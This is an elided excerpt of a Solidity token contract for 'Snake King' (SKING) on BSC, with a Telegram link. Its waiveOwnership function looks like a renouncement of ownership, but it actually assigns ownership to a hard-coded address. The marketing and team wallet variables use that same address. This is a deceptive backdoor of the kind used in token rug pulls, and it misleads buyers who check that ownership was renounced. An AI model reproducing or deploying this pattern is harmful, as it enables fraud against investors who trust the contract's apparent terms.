...
/**
Telegram : https://t.me/SnakeKingBSC
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xB6E2EB5f4C04F4Cf770432B1a59C39C7feB4D046);
    }
...
contract SnakeKing is Context, IERC20, Ownable {
    ...
    string private _name = "Snake King";
    string private _symbol = "SKING";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xB6E2EB5f4C04F4Cf770432B1a59C39C7feB4D046);
    address payable private teamWalletAddress = payable(0xB6E2EB5f4C04F4Cf770432B1a59C39C7feB4D046);
